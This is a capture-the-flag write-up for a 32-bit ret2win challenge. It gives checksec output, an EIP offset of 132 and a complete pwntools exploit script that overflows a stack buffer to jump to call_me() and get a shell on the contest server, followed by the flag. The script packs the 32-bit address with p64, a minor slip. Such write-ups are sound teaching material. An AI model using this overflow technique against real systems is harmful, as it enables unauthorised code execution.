## Description 
Call me
Pwn · Харуул Занги: 2018 · reamb
Solved: 9 · Score: 964
nc 139.162.5.230 10241
Files:

rop
rop.c

## Solution
This seems to be simple return to win pwn challenge.
Firstly let's do some basic file check

```
[Output of `file`]
rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=217b197809640fcd3c8dba7ba1f6586daac15c9d, not stripped

```
```
[Output of checksec]
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
This is 32-bit executable so we need to know the offset to the EIP register. 

By using pwndbg and using cyclic 200 to and I found the offset to the EIP to be `132`. Now that we know the EIP offset we can jump anywhere we want in the binary meaning we can jump to the `call_me()` function and get a shell.

To do that we need the address of the `call_me()` function. It is simple as just disassabling the binary in gdb and looking it up.

This is my simple script to solve this challenge.

```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'rop',checksec=False)

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10241)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

context.log_level='critical'

offset = 132
call_me_address = 0x08048d54

payload=flat([
    b'A'*offset,
    p64(call_me_address)
    ])

io = start()

io.recv()
io.sendline(payload)

io.interactive()

```

## Flag
```
HZ2018{ROP_ROP_ROP_ROP_42a27134b6f7e73c}
```